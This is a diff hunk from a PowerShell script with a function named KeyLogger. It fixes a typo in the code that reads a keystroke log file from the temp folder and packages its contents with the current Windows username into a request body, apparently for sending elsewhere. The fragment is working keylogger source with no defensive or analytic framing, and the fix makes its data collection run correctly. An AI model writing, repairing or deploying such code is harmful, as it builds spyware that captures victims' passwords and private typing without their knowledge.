@@ -53,7 +53,7 @@ function KeyLogger($logFile = "$env:TEMP\keylogger.log") {
         try {
             $logs = Get-Content "$logFile" | Out-String
             $Body = @{
-                'username' = $env:User Name
+                'username' = $env:UserName
                 'content' = $logs
             }
 
